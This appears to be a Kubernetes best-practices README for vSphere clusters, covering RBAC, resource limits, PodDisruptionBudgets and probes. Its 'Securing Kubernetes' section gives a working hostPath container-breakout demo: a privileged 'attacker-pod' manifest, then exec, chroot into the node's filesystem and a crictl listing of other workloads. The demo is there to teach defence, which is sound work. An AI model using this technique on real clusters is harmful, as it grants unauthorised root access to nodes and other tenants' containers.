![kubernetes](kubernetes.jpg)

## Kubernetes Best Practices

 - Base your images on well known trusted images to prevent supply chain attacks.
 - You should treat your image tag as immutable. Name your images with some combination of the semantic version and the SHA hash of the commit.
 - Run your application with at least two replicas to maintain HA.
 - Limit the scope of access for developers to just the namespace they require to develop in. This will limit the chance that a developer could accidentally delete resources in another namespace. 
 

    **Supervisor Cluster**
    
    The supervisor cluster is heavily restricted. Only the administrator@vsphere.local user has limited access to some of the cluster resources. The only user that has true administrative access to the supervisor cluster is root which is a special user found only if you *ssh* into a supervisor control plane node. In practice you should never edit resources in the supervisor cluster.

**Limiting access to namespaces**

1. First add the user or group to the namespace you would like the user or group to have access to. Ensure you only select *Read Only* privileges.

    ![enter image description here](user.png)

    **Supported User and Group Fields**
    
    | Field |Discription  |
    |--|--|
    | http://sso:USER-NAME@domain/ | For example, a local user name, such as `sso:joe@vsphere.local`. |
    |http://sso:GROUP-NAME@domain/ |For example, a group name from a directory server integrated with the vCenter Server, such as `sso:devs@ldap.example.com`. |

3. Then, in the cluster you want to give the user or group access to a namespace, apply the following RoleBinding to give edit privileges to the namespace.

    ```sh
    kind: RoleBinding
    apiVersion: rbac.authorization.k8s.io/v1
    metadata:
      name: rolebinding-cluster-test
      namespace: test
    roleRef:
      kind: ClusterRole
      name: edit #Default ClusterRole
      apiGroup: rbac.authorization.k8s.io
    subjects:
    - kind: User
      name: sso:test@vsphere.local #sso:<username>@<domain>
      apiGroup: rbac.authorization.k8s.io
    ```
## Understanding Kubernetes RBAC

In Kubernetes, **ClusterRoles** and **Roles** define the actions a user can perform within a cluster or namespace, respectively. You can assign these roles to Kubernetes **subjects** (users, groups, or service accounts) with **role bindings and cluster role bindings**. 

A Role always sets permissions within a particular  [namespace](https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces); when you create a Role, you have to specify the namespace it belongs in.

ClusterRole, by contrast, is a non-namespaced resource. The resources have different names (Role and ClusterRole) because a Kubernetes object always has to be either namespaced or not namespaced; it can't be both.

ClusterRoles have several uses. You can use a ClusterRole to:

1.  define permissions on namespaced resources and be granted access within individual namespace(s)
2.  define permissions on namespaced resources and be granted access across all namespaces
3.  define permissions on cluster-scoped resources

If you want to define a role within a namespace, use a Role; if you want to define a role cluster-wide, use a ClusterRole.

**Role and RoleBinding**
The following role / rolebinding will allow read write operations for the user Codey in the namespace dev-namespace.
```sh
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: read-write
  namespace: dev-namespace
rules:
- apiGroups:
  - "*"
  resources:
  - batch
  - deployments
  - daemonsets
  - configmaps
  - cronjobs
  - jobs
  - pods
  - replicasets
  - services
  - secrets
  - statefulsets
  - ingresses
  - replicationcontrollers
  - horizontalpodautoscalers
  verbs:
  - get
  - list
  - watch
  - create
  - update
  - patch
  - delete
---
apiVersion: rbac.authorization.k8s.io/v1beta1
kind: RoleBinding
metadata:
  name: read-write-binding  
roleRef:  
  kind: Role
  name: read-write  
  apiGroup: rbac.authorization.k8s.io  
subjects:  
- kind: User  
  name: codey  
  apiGroup: rbac.authorization.k8s.io
```

Similarly the following ClusterRole / ClusterRolebinding gives the user, infra-monitor, rights to view and list resources across the cluster but no edit or write privileges.


```sh
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: infra-monitor
rules:
- apiGroups: [""] # "" indicates the core API group
  resources: ["*"] # "*" applies to all resourc types 
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: infra-monitor-binding
roleRef:
  kind: ClusterRole
  name: infra-monitor
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: User
  name: sso:infra@vsphere.local
  apiGroup: rbac.authorization.k8s.io
```  

## Pod Resource Management

One of the most important aspects of managing applications in Kubernetes is appropriately managing pod resources. Managing pod resources consists of managing CPU and memory to optimize the overall utilization of your Kubernetes cluster.

For the scheduler to optimize resources and make intelligent placement decisions, it needs to understand the requirements of an application. As an example if a container needs a minimum of 2GB to perform, we need to define this in our pod spec, so the scheduler knows that the container requires 2GB of memory on the host to which it schedules the container.

**Resource Request**

 ```sh
apiVersion: v1
kind: Pod
metadata:
  name: memory-req
spec:
  containers:
  - name: memory-req
    image: nginx
    resources: 
      requests:
        memory: 2000Mi
```

A resource request defines that a container requires X amount of CPU or memory to be scheduled. If you were to specify that the pod requires 8GB of memory and all your nodes have 7.5GB of memory, the pod would not be scheduled. If the pod can not be scheduled, it will go into a pending state.

To determine the available free resources in your cluster, use the following command to determine the available resources on each node.

```sh
kubectl top nodes
```

**Resource Limits**

Resource limits define the maximum CPU or memory that a pod is given. With CPU limits, the container is throttled from using more than its specified limit. With memory limits, the pod is restarted if it reaches its limit. The pod might be restarted on the same host or a different host within the cluster.

Specifying limits for containers is a good practice to ensure that applications are allotted their fair share of resources within the cluster.

```sh
apiVersion: v1
kind: Pod
metadata:
  name: limits
  namespace: limits-ns
spec:
  containers:
  - name: frontend
    image: nginx:alpine
    resources:
      limits:
        cpu: "700m"
        memory: "200Mi"
      requests:
        cpu: "700m"
        memory: "200Mi"
```

When a pod is created, it's assigned one of the following Quality of Service (QoS) classes

 - Guarenteed (when requests and limits are the same for both memory and CPU)
 - Burstable (when limits are set higher then the requests)
 - Best Effort (when no requests or limits are set)

**PodDisruptionBudgets**

On occasion Kubernetes might need to evict pods from a host. There are two types of evictions: voluntary and involuntary disruptions.

 - Involuntary disruptions can be caused by hardware failure, network
   issues, kernel panics or a node being out of resources.
 - Voluntary evictions can be caused by performing maintenance on the
   cluster, the cluster autoscaler deallocating nodes, or updating pod
   templates.

To ensure uptime of the application, you can set a PodDisruptionBudget to ensure uptime of the application when pods need to be evicted. A PodDisruptionBudget allows you to set a policy on the minimum available and maximum un-available pods during voluntary eviction events.

Example:
```sh
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: frontend-pdb
  namespace: dev-ns
spec:
  minAvailable: 5
  selector:
    matchLabels:
      app: frontend
```

 In the above example we specify that there must be at least five replicas available at any given time.

In the example below we will specify a maximum number of replicas that can be unavailable.

```sh
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: frontend-pdb
  namespace: dev-ns
spec:
  maxUnavailable: 20%
  selector:
    matchLabels:
      app: frontend
```

## Securing Kubernetes

The term “Container Breakout” refers to the event where a malicious or legitimate user is able to escape the container isolation and access resources (e.g. filesystem, processes, network interfaces) on the host machine.

The following demonstrates where it is possible to abuse *hostpath* to gain root access to the underlying Kubernetes node.

Apply the following to a namespace in the cluster:

```sh
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: attacker-pod
  name: attacker-pod
  namespace: test
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: ubuntu
    name: attacker-pod
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-fs
      mountPath: /host
  restartPolicy: Never
```
Next, exec into the container:

```sh
kubectl exec -it attacker-pod -n test -- bash
root@workload-worker-nodepool-a1-m2r7d-847d79df59-69v67:/#
```

Next we *chroot* our process to the Node’s root filesystem accessible to us in _/host_ directory due to _hostPath_ volume mount.

```sh
root@workload-worker-nodepool-a1-m2r7d-847d79df59-69v67:/# chroot /host/ bash
root [ / ]#
```

At this point we can access all  Containers running in the node irrespective of which Pod or Namespace they belong to.

```sh
root [ / ]# crictl ps
CONTAINER           IMAGE               CREATED             STATE               NAME                               ATTEMPT             POD ID
67a1e02b051d9       88736fe827391       7 hours ago         Running             nginx                              0                   58187e661b0ec
c20e23877b741       a8780b506fa4e       7 hours ago         Running             attacker-pod                       0                   66ff16a536375
0a6e4a5510c6c       d8c2bca7c9ec1       8 hours ago         Running             rabbitmq                           0                   91cf266cf5623
1d333f889f709       88736fe827391       8 hours ago         Running             nginx                              0                   0750d1
```

## Configuring Liveness, Readiness and Startup Probes

The kubelet aka the "node agent" that runs on each node uses liveness probes to know when to restart a container. For example, liveness probes could catch a deadlock, where an application is running, but unable to make progress.

```sh
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: liveness
  name: liveness-exec
spec:
  containers:
  - name: liveness
    image: registry.k8s.io/busybox
    args:
    - /bin/sh
    - -c
    - touch /tmp/healthy; sleep 30; rm -f /tmp/healthy; sleep 600
    livenessProbe:
      exec:
        command:
        - cat
        - /tmp/healthy
      initialDelaySeconds: 5
      periodSeconds: 5
```

In the configuration file above there are two fields of concern:

 1. **periodSeconds** - specifies that the kubelet should perform a liveness probe every 5 seconds.
 2. **initialDelaySeconds** - tells the kubelet that it should wait 5 seconds before performing the first probe.

To perform a probe, the kubelet executes the command `cat /tmp/healthy` in the target container. If the command succeeds, it returns 0, and the kubelet considers the container to be alive and healthy. If the command returns a non-zero value, the kubelet kills the container and restarts it.